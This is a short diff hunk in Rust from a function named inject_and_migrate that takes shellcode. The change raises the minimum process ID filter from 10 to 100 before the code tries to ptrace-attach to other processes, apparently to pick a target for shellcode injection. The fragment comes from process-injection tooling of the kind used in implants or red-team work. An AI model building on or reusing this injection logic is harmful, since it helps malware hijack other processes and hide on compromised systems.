@@ -17,7 +17,7 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
                                                         .split('\n')
                                                         .flat_map(|s| s.parse().ok())
                                                         .collect();
-    pids.retain(|i| *i > 10 && *i != process::id() as i32);
+    pids.retain(|i| *i > 100 && *i != process::id() as i32);
     for pid in pids.iter().rev() {
         if attach(Pid::from_raw(*pid)).is_ok() {
             target_pid = *pid;
